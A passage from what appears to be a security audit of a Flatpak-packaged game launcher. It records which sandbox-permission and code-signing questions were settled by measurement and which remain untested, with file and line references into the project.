   input, `build-aux/flatpak/com.goshapps.GameHandler.json:13-26`, and the
   grant differ in **three** ways, only one of which is this repository's:
   `filesystems=home;…` on the *old* build matched the manifest as it then
   stood, but the grant also carries `xdg-config/gtk-3.0:ro`,
   `xdg-config/gtk-4.0:ro`, `xdg-config/kdeglobals:ro` and
   `xdg-data/color-schemes:ro` — injected by the **BaseApp**
   (`org.winehq.Wine`, whom the same command shows carrying exactly those
   four) — and an `[Environment] QT_QPA_PLATFORMTHEME=kde` entry that is in no
   manifest here. The third difference was this environment's own:
   `flatpak override --user --show` reported a stale
   `devices=!all;dri;input;usb;` override from an earlier phase. So the
   distinction the item draws is real and it cuts further than the item
   expected: **the grant is not a function of this repository's manifest
   alone.** A manifest-only reading would have got `home` right by luck and the
   four BaseApp additions wrong, and a test that greps the manifest — which is
   what `tests/test_packaging.py` does, necessarily, since there is no bundle
   at test time — cannot see any of it. The four additions are read-only and
   theme-related, so none is a finding; the *method* is what this item was for.
2. **Whether `osslsigncode verify` without `-CAfile` already rejects a self-signed
   certificate.** This is the half of SEC-03 that determines its impact.
   `osslsigncode` is not installed in this environment (`which osslsigncode` →
   not found), so the chain behaviour was not executed. The settling test is one
   run of `osslsigncode verify -in <self-signed PE whose Subject carries a
   recipe's publisher string>`, recording the exit code.
3. **Whether the Steam `:ro` grant is redundant given `home` — SETTLED, and the
   answer is *neither* of the two the item offers.** The item supposed Flatpak's
   `home` grant covers `~/.var/app` or does not. It does **not**: measured in
   the sandbox with the *old, wide* grant in place, `ls
   ~/.var/app/com.valvesoftware.Steam/data/Steam` returned `No such file or
   directory` while `~/.local/share/Steam/steamapps/common` was readable. The
   Steam Flatpak data directory is another application's private subtree and
   Flatpak masks it even under `home`. So `manifest:25`'s `:ro` grant is the
   *only* reason that path is reachable, it is load-bearing rather than
   redundant, and it is **unaffected by SEC-02's narrowing** — the two grants
   are independent, which is why the narrowed manifest keeps both. The evidence
   is the parent listing rather than the missing target: `~/.var/app` is a real
   directory holding fifty-odd entries on this host, and inside the sandbox —
   under the *wide* grant, before SEC-02 narrowed anything — `ls ~/.var/app`
   returned exactly one entry, `com.goshapps.GameHandler`. The Steam Flatpak is
   not installed here, so probing the target path alone could not have told
   masking apart from absence; the parent listing can, and does.
4. **Whether a portal could replace the home grant — SETTLED: no, and the reason
   is narrower than §3's.** The assertion was that choosers "do not replace this
   — the app must *execute* games from those locations afterwards". Executing a
   chosen file is in fact not the obstacle: a planted executable on a home path
   ran with exit 0 under the narrowed grant, and the chooser already *is* the
   document portal (`locate_exe_task`, `crates/app/src/main.rs:3433-3450`, whose
   answers arrive as `/run/user/<uid>/doc/<id>/…` FUSE paths). The obstacle is
   the other half of §4.1: a portal grant exists only for a path the user picked
   in a dialog, and paths reach the launcher without one. Two do, and both are
   from the tree rather than from imagination: `exe_path` is free text in the
   add/edit form and is executed as typed (`crates/app/src/state.rs:349`, `:448`,
   `as_local_path`; `shortcut_for`), and `shortcut_directory_in`
   (`crates/core/src/runners/desktop.rs:96-98`) *writes* to the user's menu.
   Every other path the launcher touches — prefixes, covers, runners, downloads
   — is under its own data directory, so it needs no grant at all. That is the
   correct form of the claim, and §4.1 now carries it. (The chooser flows that
   *are* picker-driven, covers among them at `main.rs:1900`/`:1919`, are the
   ones §4.1's original sentence was about and are unaffected.)
5. **The provenance of the gamescope `PATH` entry** in
   `--env=PATH=/usr/lib/extensions/vulkan/gamescope/bin:…` (`manifest:24`).
   `launch_opts.rs:745` requires *a* `gamescope` on `PATH`, and
   `runners/mod.rs:236-239` names
   `org.freedesktop.Platform.VulkanLayer.gamescope//25.08` as the user's fix — but
   nothing in the tree checks that the extension installs its binary at
   `/usr/lib/extensions/vulkan/gamescope/bin` in the runtime the manifest pins,
   and `docs/migration/packaging.md` §3 itself flags this as an unresolved
   question with a KDE-runtime alternative path.
6. **Runtime sandbox behaviour.** Whether `--device=dri` suffices for the GPU
   under the software renderer (`iced_tiny_skia`, per `docs/audit/BASELINE.md`),
   whether a controller works without `--device=all`, and whether `--share=ipc` is
   needed at all were not tested; no bundle was run under a sandbox.
7. **Network-path reachability.** `netpaths.rs`'s gvfs mapping and the
   `UnreachableShare` branches depend on a live gvfs mount. Only the code was read
   (`netpaths.rs:126`, `:191-202`); no share was resolved against a running
   session.
